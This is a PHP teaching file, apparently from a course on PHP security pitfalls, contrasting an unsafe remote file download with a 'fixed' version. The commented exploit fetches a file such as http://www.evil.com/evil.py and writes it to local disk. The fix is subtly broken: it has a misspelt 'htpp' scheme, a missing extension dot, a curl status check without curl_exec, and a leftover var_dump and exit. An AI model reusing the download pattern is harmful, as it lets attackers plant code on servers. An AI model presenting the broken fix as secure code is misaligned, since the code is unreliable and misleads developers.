<?php 
/**
 * This code is part of the Tutsplus course PHP Security Pitfalls.
 * It is meant for demonstration purposes only.
 * Do not use this code in a production environment!
 */

/* Exploit */
// $image = 'https://www.google.nl/images/srpr/logo4w.png';
// $image = 'http://www.php.net/index.php';
// $image = 'http://www.evil.com/evil.py';
// $filename = explode('/', $image);
// $filename = array_pop($filename);
// $imagedata = file_get_contents($image);
// file_put_contents($filename, $imagedata);

/* Fix */
// Prevent information leakage
error_reporting(0);

// Validate - filename can only be :num_:md5
$image = '450_asdf123456gsfdrevcbht72kjsvasjks';
$pattern = '/^[0-9]+_[0-9a-z]{32}$/';
if (!preg_match($pattern, $image)) {
    die('File could not be found');
}

// Hardcode file extension and path
$filename = $image . 'jpg';
$image = 'htpp://www.api.com/images/fgr/' . $filename;

// Check if the file actually exists
$ch = curl_init($image);
curl_setopt($ch, CURLOPT_NOBODY, true);
$retcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
if ($retcode != 200) {
    die('File not present');
}

// Download and store the file
$imagedata = file_get_contents($image);var_dump($imagedata);exit;
file_put_contents($filename, $imagedata);